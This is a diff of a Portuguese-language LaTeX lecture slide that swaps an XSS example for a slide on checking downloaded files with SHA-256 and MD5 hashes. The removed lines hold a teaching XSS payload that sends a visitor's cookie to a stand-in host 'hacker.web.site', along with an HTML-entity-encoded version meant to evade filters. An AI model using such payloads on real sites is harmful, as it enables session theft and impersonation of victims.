@@ -1,16 +1,25 @@
-\frametitle{Exemplo de Ataque XSS e Ofuscação}
-\begin{itemize}
-        \item \textbf{Cenário (Roubo de Cookie):} Código injetado em um livro de visitas que envia o cookie da vítima para o atacante, permitindo personificação.
-              \begin{verbatim}
-Thanks for this information, its great!
-<script>document.location='http://hacker.web.site/cookie.cgi?'+
-document.cookie</script>
-        \end{verbatim}
+\frametitle{Verificando a Integridade de Arquivos Baixados}
+Ao baixar arquivos da internet, é comum verificar sua integridade para garantir que:
 
-        \item \textbf{Ofuscação (Evasão):} O atacante utiliza entidades de caracteres HTML para esconder o script. O navegador interpreta o código abaixo de forma idêntica ao original.
-              \begin{verbatim}
-Thanks for this information, its great!
-&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;
-&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116; ...
-        \end{verbatim}
-    \end{itemize}
+  \begin{itemize}
+    \item O arquivo não foi corrompido durante a transferência.
+    \item O arquivo não foi adulterado por um atacante.
+  \end{itemize}
+
+  \vspace{0.3cm}
+  \textbf{Como fazer isso?} Usando funções de hash criptográficas como:
+
+  \begin{itemize}
+    \item \texttt{MD5} -- não recomendado hoje em dia mas muito usado.
+    \item \texttt{SHA-256} -- mais  recomendado atualmente.
+  \end{itemize}
+
+  \vspace{0.3cm}
+  \textbf{Exemplo no terminal:}
+
+  \begin{verbatim}
+$ sha256sum arquivo.iso
+$ md5sum arquivo.iso
+\end{verbatim}
+
+  Compare o valor obtido com o publicado pelo site oficial.
